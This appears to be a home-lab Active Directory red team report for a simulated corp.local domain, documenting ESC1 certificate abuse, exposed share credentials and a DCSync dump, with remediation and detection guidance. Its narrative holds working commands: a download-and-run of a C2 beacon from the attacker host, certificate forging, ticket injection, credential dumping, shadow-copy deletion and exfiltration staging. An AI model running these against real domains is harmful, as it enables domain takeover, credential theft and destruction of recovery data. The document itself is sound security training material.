# Active Directory Red Team Report - corp.local

| Field | Detail |
|-------|--------|
| **Classification** | Confidential - Lab / Portfolio Use Only |
| **Target Environment** | Active Directory - Windows Server 2025 / Windows 11 |
| **Domain** | `corp.local` |
| **Report Status** | Final |
| **Assessment Type** | Internal Red Team - Active Directory |
| **C2 Framework** | AdaptixC2 v1.2 |
| **Attacker Platform** | Kali Linux / Hyper-V Lab |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Objectives](#2-scope--objectives)
3. [Methodology](#3-methodology)
4. [Attack Chain Overview](#4-attack-chain-overview)
5. [Findings](#5-findings)
   - [FIND-01 - AD CS Misconfiguration - ESC1 (Vulnerable Certificate Template)](#find-01--ad-cs-misconfiguration--esc1-vulnerable-certificate-template)
   - [FIND-02 - Credentials Exposed in World-Readable Network Share](#find-02--credentials-exposed-in-world-readable-network-share)
   - [FIND-03 - Full Domain Compromise via DCSync](#find-03--full-domain-compromise-via-dcsync)
6. [Technical Narrative](#6-technical-narrative)
   - [Phase 1 - Initial Access & C2 Establishment](#phase-1--initial-access--c2-establishment)
   - [Phase 2 - Situational Awareness & AD Enumeration](#phase-2--situational-awareness--ad-enumeration)
   - [Phase 3 - AD CS Enumeration & ESC1 Exploitation](#phase-3--ad-cs-enumeration--esc1-exploitation)
   - [Phase 4 - Domain Compromise via DCSync](#phase-4--domain-compromise-via-dcsync)
   - [Phase 5 - Impact Simulation](#phase-5--impact-simulation)
7. [MITRE ATT&CK Mapping](#7-mitre-attck-mapping)
8. [Remediation Summary](#8-remediation-summary)
9. [Appendix](#9-appendix)

---

## 1. Executive Summary

An internal red team assessment was conducted against a simulated corporate Active Directory environment (`corp.local`) running Windows Server 2025 and Windows 11. The exercise began from an assumed-breach position - a single low-privilege domain account (`j.smith`) representing a phished employee - and resulted in **full domain compromise** with all domain credential material extracted.

A misconfigured Active Directory Certificate Services template (`CorpUserV2`) allowed any domain user to request a certificate impersonating the Domain Administrator. Due to Windows Server 2025 enforcing SID extension validation (KB5014754), the Administrator SID was resolved via LDAP BOF before re-requesting the certificate with the embedded SID. The certificate was used to obtain a TGT and NTLM hash for the `Administrator` account via PKINIT/UnPAC-the-hash, followed by a DCSync attack executed directly through the AdaptixC2 beacon that dumped all 12 domain accounts including the `krbtgt` hash.

Additionally, a world-readable network share on the domain controller was found to contain plaintext service account credentials, representing an independent high-severity finding.

The combination of these findings represents a **critical exposure**. The AD CS misconfiguration alone provides a silent, sub-five-minute path from any domain user account to full domain compromise.

**Finding summary:** 2 Critical, 1 High

---

## 2. Scope & Objectives

### Environment

| Asset | IP | Role |
|---|---|---|
| DC01 | 10.10.10.10 | Domain Controller, AD CS (corp-CA), DNS |
| CLIENT01 | 10.10.10.20 | Windows 11 Workstation (OU=Workstations) |
| Kali C2 | 10.10.10.5 | AdaptixC2 teamserver + attack tooling |
| Windows Host | 10.10.10.1 | Hyper-V host / gateway |

### Objectives

- Identify and exploit AD misconfigurations from a low-privilege initial foothold
- Demonstrate viable attack paths from domain user to full domain compromise
- Operate C2 via AdaptixC2 using BOF-based post-exploitation where possible
- Demonstrate business impact of credential theft and lateral movement
- Provide actionable remediation guidance mapped to each finding

### Initial Foothold

| Username | Privilege | Scenario |
|---|---|---|
| `j.smith` | Low - Domain User (Sales OU) | Phished employee - assumed breach |

### Out of Scope

- Physical access
- Social engineering beyond the assumed phished account
- Denial of service

---

## 3. Methodology

The assessment followed a structured kill chain aligned to the MITRE ATT&CK framework:

```
Reconnaissance → Initial Access → C2 Establishment → Discovery
    → Credential Access → Privilege Escalation → Impact
```

**C2 Architecture:**

AdaptixC2 v1.2 teamserver operated on Kali (10.10.10.5:4321). HTTP beacon delivered to CLIENT01, operating as `corp\j.smith`. All post-exploitation activity (AD enumeration, Kerberos abuse, DCSync) executed via AdaptixC2 Extension-Kit BOFs where possible, with Certipy used from Kali for AD CS operations.

**Tools used:**

| Tool | Purpose |
|---|---|
| AdaptixC2 + Extension-Kit | C2, BOF execution, AD enumeration, Kerberos abuse, DCSync |
| Certipy | AD CS enumeration and ESC1 exploitation |
| impacket-ticketConverter | ccache to kirbi conversion for ticket injection |
| NetExec (nxc) | SMB enumeration, remote execution |
| smbclient | SMB share enumeration |

**Note on Windows Server 2025 hardening:** Several standard techniques encountered enforcement controls specific to Server 2025, including mandatory LDAP signing (LDAPS required), AES-only Kerberos (RC4 disabled), and SID extension enforcement on AD CS certificates (KB5014754). These are documented throughout the narrative.

---

## 4. Attack Chain Overview

```
Initial Access (T1078.002)
  └── Phished user: j.smith - AdaptixC2 HTTP beacon on CLIENT01
        |
C2 Established - AdaptixC2 beacon (corp\j.smith, Medium integrity)
        |
Discovery - AdaptixC2 BOFs (T1087.002, T1135)
  └── whoami BOF → j.smith confirmed, Medium integrity, Sales-Users
  └── ldap get-users → 10 domain accounts enumerated
  └── ldap get-object administrator → objectSid resolved in-beacon
  └── certi enum → CorpUserV2 flagged: SubjectNameEnrolleeSupplies
                   + Client Auth EKU + Domain Users enroll rights
        |
AD CS ESC1 (T1649)
  └── certipy req → cert with UPN administrator@corp.local
                     + SID S-1-5-21-2707865489-1470825099-139071591-500
  └── certipy auth → TGT + NT hash for Administrator (PKINIT/UnPAC-the-hash)
  └── kerbeus ptt → Administrator TGT injected into beacon session
  └── dcsync all → 12 accounts dumped including krbtgt
        |
Impact (T1490, T1048)
  └── vssadmin delete shadows /all /quiet (LOLBin - inhibit recovery)
  └── robocopy \\dc01\CorpShare C:\exfil /E (LOLBin - data staging)
        → HR_Salaries.xlsx, IT-Notes.txt, backup-config.txt
```

---

## 5. Findings

---

### FIND-01 - AD CS Misconfiguration - ESC1 (Vulnerable Certificate Template)

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **MITRE ATT&CK** | T1649 - Steal or Forge Authentication Certificates |
| **Affected Asset** | DC01 - corp-CA - Template: `CorpUserV2` |

#### Description

The Active Directory Certificate Services template `CorpUserV2` is misconfigured with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled (ESC1). This allows any enrolling user to specify an arbitrary Subject Alternative Name (SAN) in the certificate request, including identities belonging to privileged accounts such as Domain Administrators.

Three conditions combine to make this directly exploitable by any domain user:

- **`SubjectNameEnrolleeSupplies`** - enrollee controls the SAN field
- **`Client Authentication` EKU** - certificate can be used for Kerberos authentication
- **`CORP\Domain Users` Enrollment Rights** - any domain account can request the certificate
- **Manager Approval disabled** - certificates are issued immediately without review

#### Evidence

AdaptixC2 `certi enum` BOF output (as `j.smith`, low-privilege domain user):

```
[*] Listing info about the template 'CorpUserV2'
    Template Name            : CorpUserV2
    Name Flags               : SubjectNameEnrolleeSupplies
    Signatures Required      : 0
    Extended Key Usages      :
      Client Authentication
      Secure Email
      Encrypting File System
    Permissions              :
      Access Rights         :
        Principal           : CORP\Domain Users (S-1-5-21-2707865489-1470825099-139071591-513)
          Access mask       : 00000130
                              Enrollment Rights
```

Administrator SID resolved in-beacon via LDAP BOF (required for KB5014754 SID extension):

```
ldap get-object administrator

objectSid : S-1-5-21-2707865489-1470825099-139071591-500
```

Certificate requested with arbitrary SAN and embedded SID (Certipy from Kali):

```
certipy req -u j.smith@corp.local -p '<redacted>' -ca corp-CA \
  -template CorpUserV2 -upn administrator@corp.local \
  -sid S-1-5-21-2707865489-1470825099-139071591-500 -dc-ip 10.10.10.10

[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-2707865489-1470825099-139071591-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

Authentication with the forged certificate (PKINIT + UnPAC-the-hash):

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

[*] Certificate identities:
[*]     SAN UPN: 'administrator@corp.local'
[*]     SAN URL SID: 'S-1-5-21-2707865489-1470825099-139071591-500'
[*]     Security Extension SID: 'S-1-5-21-2707865489-1470825099-139071591-500'
[*] Got TGT
[*] Got hash for 'administrator@corp.local': <redacted>
```

> **Windows Server 2025 note:** The `-sid` flag was required due to KB5014754 enforcing SID extension validation in AD CS certificates. An initial request without the SID failed authentication. The SID was resolved via the AdaptixC2 `ldap get-object` BOF prior to re-requesting the certificate.

#### Business Impact

A low-privilege domain account obtained Domain Administrator credentials without any interaction from a privileged user and without exploiting a software vulnerability. The attack is silent, leaves minimal logs, and was executed in under five minutes from the AdaptixC2 beacon on CLIENT01.

#### Remediation

1. **Disable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** on `CorpUserV2`. In `certsrv.msc`, navigate to Certificate Templates, open `CorpUserV2`, and on the Subject Name tab select "Build from Active Directory information".
2. **Require Manager Approval** on any template that must retain enrollee-supplied subjects.
3. **Restrict enrollment rights** - remove `Domain Users` and grant Enroll permissions only to specific security groups with a documented business need.
4. **Enable CA auditing** - monitor Event ID 4886 (request received) and 4887 (certificate issued), alerting on certificates where the UPN in the SAN does not match the requesting account.
5. Run `Invoke-ESC1Check` from [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) periodically to detect vulnerable templates.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 4886 | Security | Certificate request received - review SAN UPN field for mismatch with requestor |
| 4887 | Security | Certificate issued - alert on certificates where SAN UPN does not match requestor sAMAccountName |

---

### FIND-02 - Credentials Exposed in World-Readable Network Share

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1 Score** | 8.1 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **MITRE ATT&CK** | T1552.001 - Credentials in Files |
| **Affected Asset** | DC01 - `\\dc01\CorpShare` |

#### Description

The network share `\\dc01\CorpShare` is readable by all domain users. The share contains text files with sensitive operational information: `IT-Notes.txt` exposes plaintext service account credentials, and `backup-config.txt` discloses the existence of a backup account. Both were accessed using the initial low-privilege foothold account `j.smith`.

#### Evidence

Share enumeration and file contents:

```
smbclient //10.10.10.10/CorpShare -U 'corp.local/j.smith%<redacted>' -c "ls"

  backup-config.txt     A   28
  HR_Salaries.xlsx      A   26
  IT-Notes.txt          A   40

cat IT-Notes.txt
svc_sql:<redacted> password rotation scheduled Q4

cat backup-config.txt
Backup account: svc_backup
```

`HR_Salaries.xlsx` was staged for exfiltration during the impact simulation phase.

#### Business Impact

Plaintext credentials stored in an accessible network location represent a critical operational security failure. Any domain user - including contractors, interns, or a compromised endpoint - can read this share.

#### Remediation

1. **Remove plaintext credentials** from all network shares immediately. Use a secrets manager (e.g. HashiCorp Vault, Azure Key Vault) for credential storage.
2. **Audit all share permissions** across domain shares. No share accessible to `Domain Users` should contain sensitive operational data.
3. **Rotate all credentials** exposed in the share immediately.
4. **Enable share access auditing** - Event ID 5140 on the DC, alerting on access to sensitive filenames by unexpected accounts.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 5140 | Security | Network share accessed - baseline normal access patterns and alert on anomalies |
| 5145 | Security | File accessed within share - alert on sensitive filenames accessed by unexpected accounts |

---

### FIND-03 - Full Domain Compromise via DCSync

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.9 |
| **CVSS Vector** | `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| **MITRE ATT&CK** | T1003.006 - OS Credential Dumping: DCSync |
| **Affected Asset** | DC01 - NTDS.dit |

#### Description

Following Domain Administrator credential acquisition via ESC1 (FIND-01), the Administrator TGT was injected into the AdaptixC2 beacon session via `kerbeus ptt`. A DCSync attack was then executed entirely through the beacon using the `dcsync all` AD-BOF, dumping credential material for all 12 domain accounts. DCSync abuses the Directory Replication Service (DRS) protocol to request credential material directly from the DC without requiring code execution on the DC itself.

#### Evidence

Administrator TGT injected into beacon session:

```
kerbeus ptt /ticket:<base64kirbi>

kerbeus klist

[*] Cached tickets: (1)
  [0]
    ClientName  : administrator @ CORP.LOCAL
    ServiceRealm: krbtgt/CORP.LOCAL @ CORP.LOCAL
    KeyType     : aes256_cts_hmac_sha1
    Flags       : reserved renewable initial
```

DCSync executed via AdaptixC2 `dcsync all` BOF:

```
dcsync all -dc dc01.corp.local --ldaps

[+] Successfully enumerated 12 users
[*] Starting DCSync for 12 objects...

[*] User: corp.local\Administrator
  nt: <redacted>

[*] User: corp.local\krbtgt
  nt: <redacted>

[*] User: corp.local\it.admin
  nt: <redacted>
  aes256: <redacted>

[*] User: corp.local\j.smith
  nt: <redacted>
  aes256: <redacted>

[*] User: corp.local\svc_sql
  nt: <redacted>

[*] User: corp.local\svc_backup
  nt: <redacted>

[*] Computer: corp.local\DC01$
  nt: <redacted>

[+] DCSync complete for 12 objects
```

12 accounts dumped in full. The `krbtgt` NT hash enables offline Golden Ticket creation with configurable ticket lifetime.

#### Business Impact

DCSync represents total and persistent domain compromise. With the `krbtgt` hash an attacker can forge Kerberos tickets for any identity with any privileges, for any duration, without touching the domain controller again. Recovery requires a double `krbtgt` password reset (24+ hours apart to allow Kerberos ticket expiry) and full credential rotation for all 12 dumped accounts.

#### Remediation

1. **Remediate FIND-01 (ESC1)** - this finding is a direct consequence of the AD CS misconfiguration. Fixing ESC1 removes the primary path to DA credentials.
2. **Perform emergency credential rotation** for all dumped accounts - prioritise `krbtgt` (double reset, 24h apart), `Administrator`, and all service accounts.
3. **Enable Protected Users group** for all privileged accounts - prevents credential caching and limits Kerberos abuse.
4. **Implement Tiered Administration** - isolate Tier 0 credentials (DA, krbtgt, CA admins) from Tier 1/2 systems.
5. **Deploy Microsoft Defender for Identity (MDI)** - detects DCSync via suspicious replication requests.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 4662 | Security | Operation performed on AD object - alert on replication GUIDs `1131f6aa`, `1131f6ad`, `1131f6a0` by non-DC accounts |
| 4929 | Security | AD replica source naming context removed - may indicate DCSync activity |

---

## 6. Technical Narrative

### Phase 1 - Initial Access & C2 Establishment

The exercise began with a single low-privilege domain account, `j.smith`, representing a phished Sales department employee. An AdaptixC2 HTTP beacon (`http_x64.exe`) was delivered to CLIENT01 via Python HTTP server from Kali and executed:

```powershell
Invoke-WebRequest http://10.10.10.5:8080/http_x64.exe -OutFile C:\Users\Public\http_x64.exe
C:\Users\Public\http_x64.exe
```

The beacon called back to the AdaptixC2 teamserver (10.10.10.5:80), establishing an interactive session operating as `corp\j.smith` at Medium integrity. All subsequent post-exploitation was performed through this beacon using Extension-Kit BOFs.

---

### Phase 2 - Situational Awareness & AD Enumeration

Initial situational awareness was established via AdaptixC2 BOFs:

```
whoami BOF output:
  UserName: CORP\j.smith
  SID: S-1-5-21-2707865489-1470825099-139071591-1103
  Groups: CORP\Domain Users, CORP\Sales-Users
  Integrity: Medium Mandatory Level
  Privileges: SeChangeNotifyPrivilege (Enabled)
```

AD enumeration was performed entirely in-beacon using LDAP BOFs over LDAPS (WS2025 enforces mandatory LDAP signing):

```
ldap get-users → 10 domain accounts identified:
  Administrator, Guest, krbtgt, it.admin, helpdesk,
  j.smith, hr.user, svc_sql, svc_backup, t.brown

ldap get-object administrator → objectSid: S-1-5-21-2707865489-1470825099-139071591-500
```

Share enumeration identified a world-readable corporate share on the DC containing plaintext service account credentials (FIND-02).

`certi enum` BOF identified `CorpUserV2` as vulnerable to ESC1:
- `Name Flags: SubjectNameEnrolleeSupplies`
- `Extended Key Usages: Client Authentication`
- `CORP\Domain Users: Enrollment Rights`
- `Signatures Required: 0`

---

### Phase 3 - AD CS Enumeration & ESC1 Exploitation

The Administrator SID was resolved in-beacon via `ldap get-object administrator` (required for WS2025 KB5014754 SID extension enforcement).

A certificate was requested from Kali via Certipy with the Administrator UPN and embedded SID:

```
certipy req -u j.smith@corp.local -p '<redacted>' -ca corp-CA \
  -template CorpUserV2 -upn administrator@corp.local \
  -sid S-1-5-21-2707865489-1470825099-139071591-500 -dc-ip 10.10.10.10

[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-2707865489-1470825099-139071591-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

PKINIT authentication with the certificate returned a TGT and NTLM hash for the Domain Administrator via UnPAC-the-hash:

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

[*] Got TGT
[*] Got hash for 'administrator@corp.local': <redacted>
```

The TGT was converted from ccache to kirbi format and injected directly into the beacon session:

```
impacket-ticketConverter administrator.ccache administrator.kirbi
base64 -w 0 administrator.kirbi → <base64>

kerbeus ptt /ticket:<base64kirbi>
kerbeus klist → administrator @ CORP.LOCAL confirmed (aes256_cts_hmac_sha1)
```

---

### Phase 4 - Domain Compromise via DCSync

With the Administrator TGT injected into the beacon session, a DCSync attack was executed entirely in-beacon using the `dcsync all` AD-BOF over LDAPS:

```
dcsync all -dc dc01.corp.local --ldaps

[+] DCSync complete for 12 objects
```

All 12 domain accounts were dumped including the `krbtgt` NT hash, representing complete and persistent domain compromise. See FIND-03 for full output.

---

### Phase 5 - Impact Simulation

To simulate post-compromise impact, two actions were executed using the Domain Administrator hash:

**Shadow Copy deletion** (inhibit system recovery - T1490):

```
nxc smb 10.10.10.10 -u administrator -H <redacted> \
  --exec-method atexec -x "vssadmin delete shadows /all /quiet"

[+] Executed command via atexec
```

**Data exfiltration staging** (LOLBin robocopy - T1048):

```
nxc smb 10.10.10.10 -u administrator -H <redacted> \
  --exec-method atexec -x "robocopy \\dc01\CorpShare C:\exfil /E"

[+] Executed command via atexec
```

Files staged for exfiltration: `HR_Salaries.xlsx`, `IT-Notes.txt`, `backup-config.txt`.

Both commands executed successfully, simulating post-compromise impact - shadow copy deletion to inhibit recovery and data staging for exfiltration.

---

## 7. MITRE ATT&CK Mapping

| Technique ID | Technique | Tool / Method | Finding |
|---|---|---|---|
| T1078.002 | Valid Accounts: Domain Accounts | `j.smith` initial foothold | - |
| T1059.001 | PowerShell | Beacon delivery via `Invoke-WebRequest` | - |
| T1087.002 | Account Discovery: Domain Account | AdaptixC2 `ldap get-users` BOF | - |
| T1135 | Network Share Discovery | `smbclient` CorpShare | FIND-02 |
| T1552.001 | Credentials in Files | `IT-Notes.txt` plaintext creds | FIND-02 |
| T1649 | Steal or Forge Authentication Certificates | Certipy ESC1 | FIND-01 |
| T1550.003 | Use Alternate Authentication Material: Pass-the-Ticket | `kerbeus ptt` BOF | FIND-01 |
| T1003.006 | OS Credential Dumping: DCSync | AdaptixC2 `dcsync all` BOF | FIND-03 |
| T1550.002 | Use Alternate Authentication Material: Pass-the-Hash | NetExec | FIND-03 |
| T1490 | Inhibit System Recovery | `vssadmin delete shadows` (LOLBin) | - |
| T1048 | Exfiltration Over Alternative Protocol | `robocopy` (LOLBin) | - |

---

## 8. Remediation Summary

| Finding | Severity | CVSS | Priority Action |
|---|---|---|---|
| FIND-01 - ESC1 Vulnerable Template | Critical | 9.8 | Disable enrollee-supplied subject on `CorpUserV2`; restrict enrollment rights |
| FIND-02 - Credentials in Share | High | 8.1 | Remove plaintext credentials; audit all share contents; rotate exposed accounts |
| FIND-03 - DCSync / Domain Compromise | Critical | 9.9 | Double-reset `krbtgt`; rotate all 12 dumped account passwords |

**Immediate actions (within 24 hours):**
- Disable `CorpUserV2` certificate template
- First `krbtgt` password reset
- Rotate `Administrator` and all service account passwords
- Remove plaintext credentials from `CorpShare`

**Short-term (within 7 days):**
- Second `krbtgt` reset (24h+ after first)
- Fix ESC1 template configuration per remediation guidance in FIND-01

**Medium-term (within 30 days):**
- Deploy Microsoft Defender for Identity for ongoing DCSync detection
- Implement tiered administration model
- Enrol all privileged accounts in Protected Users group
- Run PSPKIAudit periodically to detect vulnerable certificate templates

---

## 9. Appendix

### A. Credentials Reference (Lab Only)

| Username | NT Hash | Notes |
|---|---|---|
| Administrator | `<redacted>` | Domain Admin - obtained via ESC1 |
| krbtgt | `<redacted>` | Golden Ticket capability |
| it.admin | `<redacted>` | Domain Admin group member |
| j.smith | `<redacted>` | Initial foothold account |
| svc_sql | `<redacted>` | Service account |
| svc_backup | `<redacted>` | Backup Operators |

### B. Domain SIDs

| Account | SID |
|---|---|
| Administrator | `S-1-5-21-2707865489-1470825099-139071591-500` |
| Domain | `S-1-5-21-2707865489-1470825099-139071591` |

### C. Windows Server 2025 Hardening Observations

| Issue | Cause | Impact on Attack |
|---|---|---|
| LDAP signing enforced | WS2025 default | All LDAP BOFs required LDAPS (`--ldaps` flag) |
| RC4 Kerberos disabled | WS2025 default (AES-only) | Kerbeus kerberoasting BOF failed with error 14 (`KDC_ERR_ETYPE_NOTSUPP`) |
| SID extension enforcement (KB5014754) | AD CS patch | Initial ESC1 auth failed - SID resolved via `ldap get-object` BOF, re-requested with `-sid` flag |
| ADCS-BOF RPC unavailable | RPC/DCOM unreachable from beacon context | `certi request` BOF failed (0x800706ba) - Certipy used from Kali instead |
| ADCS-BOF PKINIT error 80 | BOF does not embed SID extension in PKINIT AS-REQ | `certi auth` BOF returned `KDC_ERR_CLIENT_NOT_TRUSTED` - Certipy auth used from Kali |

### D. AdaptixC2 Configuration

| Parameter | Value |
|---|---|
| Teamserver | 10.10.10.5:4321 |
| Listener | HTTP, port 80, callback 10.10.10.5 |
| Beacon | http_x64.exe, sleep 4s, IAT hiding enabled |
| Extensions | Extension-Kit (LDAP-BOF, Kerbeus-BOF, AD-BOF, ADCS-BOF) |

### E. References

- SpecterOps - Certified Pre-Owned (ESC1-ESC8): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Certipy by Oliver Lyak: https://github.com/ly4k/Certipy
- AdaptixC2 Framework: https://github.com/Adaptix-Framework/AdaptixC2
- AdaptixC2 Extension-Kit: https://github.com/Adaptix-Framework/Extension-Kit
- Impacket by Fortra: https://github.com/fortra/impacket
- Microsoft KB5014754 - Certificate-based authentication changes: https://support.microsoft.com/en-us/topic/kb5014754

---

*Tags: #homelab #activedirectory #redteam #ADCS #ESC1 #LOLBins #Server2025 #DCSync #AdaptixC2 #pentest*
